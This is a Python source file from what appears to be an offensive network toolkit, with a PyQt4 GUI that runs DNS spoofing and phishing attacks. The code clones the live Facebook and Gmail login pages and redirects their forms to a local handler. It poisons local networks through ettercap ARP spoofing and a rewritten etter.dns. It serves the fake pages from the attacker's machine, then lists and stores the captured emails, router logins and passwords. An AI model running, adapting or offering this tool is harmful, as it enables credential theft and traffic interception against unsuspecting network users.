#coding utf-8
from PyQt4.QtGui import *
from PyQt4.QtCore import *
import threading
from os import system,getuid,popen,chdir,path ,getcwd,walk
from time import sleep
from Modules.DHCPstarvation import frm_dhcp_Attack,conf_etter
from Modules.database import frm_datebase
from Modules.connection import *
from Core.Settings import frm_Settings
from platform import linux_distribution
from Modules.AttackUp import frm_WinSoftUp
from re import compile,search
from urllib2 import urlopen,URLError


class frm_dnsspoof(QMainWindow):
    def __init__(self, parent=None):
        super(frm_dnsspoof, self).__init__(parent)
        self.form_widget = frm_dnsAttack(self)
        self.setCentralWidget(self.form_widget)
        self.setWindowTitle("DNS Spoof + Phishing Attack Manager")
        self.setWindowIcon(QIcon('rsc/icon.ico'))
        self.config = frm_Settings()
        self.loadtheme(self.config.XmlThemeSelected())

    def loadtheme(self,theme):
        if theme != "theme2":
            sshFile=("Core/%s.css"%(theme))
            with open(sshFile,"r") as fh:
                self.setStyleSheet(fh.read())
        else:
            sshFile=("Core/%s.css"%(theme))
            with open(sshFile,"r") as fh:
                self.setStyleSheet(fh.read())

    def closeEvent(self, event):
        reply = QMessageBox.question(self, 'About DNS SPOOF',"Are you sure to quit the DNS spoof Attack?", QMessageBox.Yes |
            QMessageBox.No, QMessageBox.No)
        if reply == QMessageBox.Yes:
            event.accept()
            if getuid() == 0:
                self.alt_etter("")
                system("clear")
                self.deleteLater()
            else:
                pass
        else:
            event.ignore()


class frm_dnsAttack(QWidget):
    def __init__(self, parent=None):
        super(frm_dnsAttack, self).__init__(parent)
        self.Main = QVBoxLayout()
        self.control = None
        self.get = frm_dhcp_Attack()
        self.get_interface = frm_WinSoftUp()
        self.owd = getcwd()
        self.teste123 = 0
        self.GUI()
    def GUI(self):
        create_tables()
        self.form = QFormLayout(self)
        self.lb = QLabel("Logins Captured:")
        self.lb2 = QLabel("Database:")
        self.lb_box = QLabel("Logger Attack:")
        self.text_phi = QLabel("Status Phising Server:")
        self.text_dns = QLabel("Status Dns spoof:")
        self.lb_status_phishing = QLabel("[ OFF ]")
        self.lb_status_phishing.setStyleSheet("QLabel {  color : red; }")
        self.lb_status_dns = QLabel("[ OFF ]")
        self.lb_status_dns.setStyleSheet("QLabel {  color : red; }")
        self.grid = QGridLayout(self)
        self.new_grid = QGridLayout(self)
        self.boxlog = QListWidget(self)
        self.boxlog.setFixedHeight(100)
        self.input_custom_ip = QLineEdit(self)
        self.input_dns = QLineEdit(self)

        self.box_login =  QTextEdit(self)
        self.box_login.setFixedHeight(100)
        self.cb_interface = QComboBox(self)
        self.cb_db = QCheckBox("Save Logins",self)
        self.cb_db.setFixedHeight(30)

        self.cb_db.clicked.connect(self.savedb_checkbox_func)
        self.get_interface.refresh_interface(self.cb_interface)

        self.rb_face = QRadioButton("Facebook")
        self.rb_gmail = QRadioButton("Gmail")
        self.rb_route = QRadioButton("Route")
        self.rb_custom = QRadioButton("Custom")

        self.btn_spoof = QPushButton("Start Dns Spoof", self)
        self.btn_Start_attack = QPushButton("Start Server Phishing",self)
        self.btn_Stop_attack = QPushButton("Kill Attack",self)
        self.btn_getcapture =  QPushButton("Get Credentials", self)
        self.btn_database = QPushButton("DB.Manager",self)
        self.btn_getcapture.setFixedHeight(30)
        self.btn_database.setFixedHeight(30)

        #icons
        self.btn_spoof.setIcon(QIcon("rsc/start.png"))
        self.btn_Start_attack.setIcon(QIcon("rsc/server.png"))
        self.btn_Stop_attack.setIcon(QIcon("rsc/Stop.png"))
        self.btn_getcapture.setIcon(QIcon("rsc/password.png"))
        self.btn_database.setIcon(QIcon("rsc/database.png"))


        self.btn_Start_attack.clicked.connect(self.thread_control)
        self.btn_Stop_attack.clicked.connect(self.kill_attack)
        self.btn_getcapture.clicked.connect(self.get_logins)
        self.btn_spoof.clicked.connect(self.dns_spoof_attack)
        self.btn_database.clicked.connect(self.show_database)

        self.grid.addWidget(self.rb_face, 0, 0)
        self.grid.addWidget(self.rb_gmail, 0, 1)
        self.grid.addWidget(self.rb_route, 0, 2)
        self.grid.addWidget(self.rb_custom, 0, 3)

        self.grid.addWidget(self.btn_Start_attack, 2,0)
        self.grid.addWidget(self.btn_spoof, 2,1)
        self.grid.addWidget(self.btn_Stop_attack, 2,4)
        self.grid.addWidget(self.lb_status_phishing, 1,1)
        self.grid.addWidget(self.text_phi, 1,0)
        self.grid.addWidget(self.text_dns, 1,2)
        self.grid.addWidget(self.lb_status_dns, 1,3)

        self.new_grid.addWidget(self.lb, 0,0)
        self.new_grid.addWidget(self.btn_getcapture, 0,1)
        self.new_grid.addWidget(self.cb_db, 0,2)
        self.new_grid.addWidget(self.btn_database, 0,3)

        self.form.addRow(self.lb_box)
        self.form.addRow(self.boxlog)
        self.form.addRow(self.new_grid)
        #self.form.addRow(self.lb,self.btn_getcapture)
        self.form.addRow(self.box_login)
        self.form.addRow("Interface:", self.cb_interface)
        self.form.addRow("Custom  IP Attack:",self.input_custom_ip)
        self.form.addRow("Custom  Domain Attack:",self.input_dns)
        
        self.form.addRow(self.grid)
        self.Main.addLayout(self.form)
        self.setLayout(self.Main)



    def savedb_checkbox_func(self):
        if self.cb_db.isChecked():
            if self.rb_face.isChecked():
                log = open("Modules/Phishing/Facebook/log.txt", "r")
                if len(log.read()) > 0:
                    log = open("Modules/Phishing/Facebook/log.txt", "r")
                    for i,j in enumerate(log.readlines()):
                        s = j.split("-")
                        add_Face_db(str(s[0]), str(s[1]))
                    QMessageBox.information(self,"Logins Database", "Passwords saved with success...")
                else:
                    QMessageBox.information(self,"Nothing to Save :(", "Nothing captured in logs")
                if self.cb_db.isChecked():
                    self.cb_db.setChecked(False)

            elif self.rb_gmail.isChecked():
                log = open("Modules/Phishing/Gmail/log.txt", "r")
                if len(log.read()) > 0:
                    log = open("Modules/Phishing/Gmail/log.txt", "r")
                    for i,j in enumerate(log.readlines()):
                        s = j.split("-")
                        add_gmail_db(s[0], s[1])
                    QMessageBox.information(self,"Logins Database", "Passwords saved with success...")
                else:
                    QMessageBox.information(self,"Nothing to Save :(", "Nothing captured in logs")
                if self.cb_db.isChecked():
                    self.cb_db.setChecked(False)
            elif self.rb_route.isChecked():
                log = open("Modules/Phishing/Route/log.txt", "r")
                if len(log.read()) > 0:
                    log = open("Modules/Phishing/Route/log.txt", "r")
                    for i,j in enumerate(log.readlines()):
                        s = j.split("-")
                        add_Route_db(s[0], s[1])
                    QMessageBox.information(self,"Logins Database", "Passwords saved with success...")
                else:
                    QMessageBox.information(self,"Nothing to Save :(", "Nothing captured in logs")
                if self.cb_db.isChecked():
                    self.cb_db.setChecked(False)
    def show_database(self):
        self.w = frm_datebase()
        self.w.setGeometry(QRect(100, 100, 450, 300))
        self.w.show()
    def dns_status(self,control):
        if control == False:
            self.lb_status_dns.setText("[ OFF ]")
            self.lb_status_dns.setStyleSheet("QLabel {  color : red; }")
            system("clear")
        else:
            self.lb_status_dns.setText("[ ON ]")
            self.lb_status_dns.setStyleSheet("QLabel {  color : green; }")
            system("clear")

    def Phishing_status(self,control):
        if control == False:
            self.lb_status_phishing.setText("[ OFF ]")
            self.lb_status_phishing.setStyleSheet("QLabel {  color : red; }")
            system("clear")
        else:
            self.lb_status_phishing.setText("[ ON ]")
            self.lb_status_phishing.setStyleSheet("QLabel {  color : green; }")
            system("clear")


    def get_logins(self):
        self.teste123 += 1
        if self.rb_face.isChecked():
            self.box_login.clear()
            logins = []
            chdir(self.owd)
            log = open("Modules/Phishing/Facebook/log.txt", "r")
            self.box_login.append("=================== Facebook Logins =====================")
            for i,j in enumerate(log.readlines()):
                logins.append(i)
                s = j.split("-")
                if s != None:
                    self.box_login.append("Email: " +s[0] + "   Password: " +s[1])

        elif self.rb_gmail.isChecked():
            self.box_login.clear()
            logins = []
            chdir(self.owd)
            self.box_login.append("=================== Gmail Logins =====================")
            log = open("Modules/Phishing/Gmail/log.txt", "r")
            for i,j in enumerate(log.readlines()):
                logins.append(i)
                s = j.split("-")
                if s != None:
                    self.box_login.append("Email: " +s[0] + "   Password: " +s[1])

        elif self.rb_route.isChecked():
            self.box_login.clear()
            logins = []
            chdir(self.owd)
            self.box_login.append("=================== Router Logins =====================")
            log = open("Modules/Phishing/Route/log.txt", "r")
            for i,j in enumerate(log.readlines()):
                logins.append(i)
                s = j.split("-")
                if s != None:
                    self.box_login.append("IP: " +s[0] + "   Password: " +s[1])

    def kill_attack(self):
        if self.control != None:
            self.alt_etter("")
            system("killall xterm")
            QMessageBox.information(self,"Clear Setting", "log cLear success ")
            self.control = None
        else:
            QMessageBox.information(self,"None", "There is nothing to clean")
            self.alt_etter("")

    def thread_control(self):
        self.box_login.clear()
        if self.rb_face.isChecked():
            url = 'http://facebook.com'
            try:
                sock = urlopen(url).read()
                self.control = 1
            except URLError, e:
                QMessageBox.information(self,"Error","Server not found, can't find the server at focebook. " + str(e))
            if self.control != None:
                if not getuid() == 0:
                    QMessageBox.information(self, "Permission Denied", 'the Tool must be run as root try again.')
                    return None

                self.t = threading.Thread(target=self.phishing_page,args=(sock,))
                self.t.daemon = True
                self.t.start()

        elif self.rb_gmail.isChecked():
            sock = None
            try:
                request = urlopen('http://accounts.google.com/Login?hl').read()
                self.control = 1
            except URLError,e:
                QMessageBox.information(self,"Error","Server not found, can't find the server at google. " + str(e))
            if self.control != None:
                self.t = threading.Thread(target=self.phishing_page,args=(sock,))
                self.t.daemon = True
                self.t.start()

        elif self.rb_route.isChecked():
            sock = 1
            if not getuid() == 0:
                    QMessageBox.information(self, "Permission Denied", 'the Tool must be run as root try again.')
                    return None
            self.t = threading.Thread(target=self.phishing_page,args=(sock,))
            self.t.daemon = True
            self.t.start()

        else:
            QMessageBox.information(self,"Error Select", " Choose one option from Attack")

    def dns_spoof_attack(self):
        self.option = None
        self.active = 0
        self.check = 0
        if self.rb_face.isChecked():
            self.option = "facebook.com"
        elif self.rb_gmail.isChecked():
            self.option = 'gmail.com'
        elif self.rb_route.isChecked():
            self.active = 2
        elif self.rb_custom.isChecked():
            self.option = self.input_dns
            self.active = 1
        else:
            self.active = 4

        self.path_file = self.find("etter.dns", "/etc/ettercap/")
        if self.path_file == None:
            self.path_file = self.find("etter.dns", "/usr/share/ettercap/")
            if not  self.path_file != None:
                QMessageBox.information(self, 'Path not Found', "the file etter.dns not found check if ettercap this installed")
        if self.path_file != None:
            ipaddress = self.get_ip_local (self.cb_interface.currentText())
            if  self.active != 0:
                if not self.active == 1:
                    config_dns = ("* A %s"%(ipaddress))
                    self.check = 1
                else:
                    if self.input_dns.text() == "" and self.input_custom_ip.text() == "":
                        QMessageBox.information(self, "Inputs Error", "Enter the DNS or IP in the text inputs please,")
                    else:
                        if self.input_dns.text() == "":
                            config_dns = ("* A %s"%(self.input_custom_ip.text()))
                            self.check = 1
                        else:
                            if self.input_custom_ip.text() != "":
                                config_dns = ("%s      A   %s\n*.%s    A   %s\nwww.%s  PTR %s\n"%(self.input_dns.text(),self.input_custom_ip.text(),self.input_dns.text(),self.input_custom_ip.text(),self.input_dns.text(),self.input_custom_ip.text()))
                                self.check = 1
                            else:
                                QMessageBox.information(self, "Inputs IP Error", "Please, Enter the IP to redirect traffic.")
                                self.check = 0
            else:
                config_dns = ("%s      A   %s\n*.%s    A   %s\nwww.%s  PTR %s\n"%(self.option,ipaddress,self.option,ipaddress,self.option,ipaddress))
                self.check = 1
            if not getuid() == 0:
                QMessageBox.information(self, "Permission Denied", 'the Tool must be run as root try again.')
            else:
                if not self.check != 0:
                    pass
                else:
                    self.alt_etter(config_dns)
                    self.control = 1
                    self.t = threading.Thread(target=self.DNS_Attack_thread,args=(str(self.cb_interface.currentText()),))
                    self.t.daemon = True
                    self.t.start()

    def DNS_Attack_thread(self,interface):
        self.dns_status(True)
        distro = linux_distribution()
        if search("Kali Linux",distro[0]):
            n = (popen("""xterm -geometry 75x15-1+200 -T "DNS SPOOF Attack On %s" -e ettercap -T -Q -M arp -i %s -P dns_spoof // //"""%(interface,interface)).read()) + "exit"
        else:
            n = (popen("""xterm -geometry 75x15-1+200 -T "DNS SPOOF Attack On %s" -e ettercap -T -Q -M arp -i %s -P dns_spoof"""%(interface,interface)).read()) + "exit"
        while n != "dsa":
            if n == "exit":
                self.dns_status(False)
                break

    def alt_etter(self,data):
        configure = conf_etter(data)
        file = open(self.path_file, "w")
        file.write(configure)
        file.close()

    def find(self,name, paths):
        for root, dirs, files in walk(paths):
            if name in files:
                return path.join(root, name)

    def phishing_page(self,sock):
        self.boxlog.clear()
        type_phishing = None
        if sock != None and sock != 1:
            path = "Modules/Phishing/Facebook/"
            try:
                chdir(path)
            except OSError,e:
                return None
            pat = compile('<DT><a href="[^"]+">(.+?)</a>')
            self.boxlog.addItem("[+] Resquest Target Page")
            sock = sock.replace("https://www.facebook.com/login.php?login_attempt=1", "login.php")
            face_page= open("index.html", "w")
            face_page.write(sock)
            face_page.close()
            type_phishing = "Facebook"
        elif sock == 1 and sock != None:
            path = "Modules/Phishing/Route/"
            chdir(path)
            type_phishing = "Route"
            self.boxlog.addItem("[+] Path page:/Modules/Phishing/Route")
        else:
            path = "Modules/Phishing/Gmail/"
            try:
                chdir(path)
                request = urlopen('http://accounts.google.com/Login?hl').read()
                request = request.replace("//ssl.gstatic.com/accounts/ui/","")
                request = request.replace("https://accounts.google.com/ServiceLoginAuth","login.php")
                google_page = open("index.html", "w")
                google_page.write(request)
                google_page.close()
            except OSError,e:
                return None
            type_phishing = "Gmail"
            self.boxlog.addItem("[+] Path page:/Modules/Phishing/Gmail")

        self.boxlog.addItem("[+] Set Path %s Phishing"%(type_phishing))
        self.boxlog.addItem("[+] Get IP Local")
        ip = self.get_ip_local(None)
        self.boxlog.addItem("[+] Start Phishing Attack")
        popen("service apache2 stop")
        self.Phishing_status(True)
        if ip == None:
            self.Phishing_status(False)
            self.lb_status_phishing.setText("Error Getting IPaddress")
            sleep(5)
            self.Phishing_status(False)
            self.boxlog.clear()
        else:
            n = (popen("""xterm -geometry 75x15-1+0 -T "Phishing %s" -e php -S %s:80"""%(type_phishing,ip))).read() + "exit"
            chdir(self.owd)
            while n != "dsa":
                if n == "exit":
                    self.Phishing_status(False)
                    self.boxlog.clear()
                    break

    def get_ip_local(self,card):
        if not card != None:
            get_interface = self.get.get_card()
            out = popen("ifconfig %s | grep 'Bcast'"%(get_interface)).read().split()
            if len(out) > 0:
                ip = out[1].split(":")
                return ip[1]
            else:
                return None
        else:
            out = popen("ifconfig %s | grep 'Bcast'"%(card)).read().split()
            if len(out) > 0:
                ip = out[1].split(":")
                return ip[1]
            else:
                return None

